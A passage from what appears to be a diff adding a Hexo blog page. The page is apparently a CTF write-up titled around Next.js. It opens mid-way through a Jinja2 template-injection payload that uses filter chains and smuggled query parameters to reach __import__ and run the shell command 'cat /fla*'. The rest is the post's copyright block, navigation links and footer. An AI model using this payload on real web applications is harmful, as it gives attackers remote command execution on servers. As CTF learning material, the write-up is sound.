class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;cmd&#x27;</span>))|attr(<span class="string">&#x27;read&#x27;</span>)()%&#125;&#123;%<span class="built_in">print</span>(output)%&#125;&#123;%endwith%&#125;&amp;<span class="built_in">globals</span>=__globals__&amp;getitem=__getitem__&amp;builtins=__builtins__&amp;<span class="keyword">import</span>=<span class="built_in">__import__</span>&amp;cmd=cat+/fla*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/rkhoCPU7We.png" alt="image-11"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>megat</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ilikeronnnnii.github.io/2025/03/17/nextjs/">https://ilikeronnnnii.github.io/2025/03/17/nextjs/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>peepo pog</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2025/07/01/cydes-qualifier/">Cydes Qualifier 25</a>
+            
+            
+            <a class="next" rel="next" href="/2025/03/17/pentest/">CompTIA PenTest+ (PT0-002) Review</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© megat | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
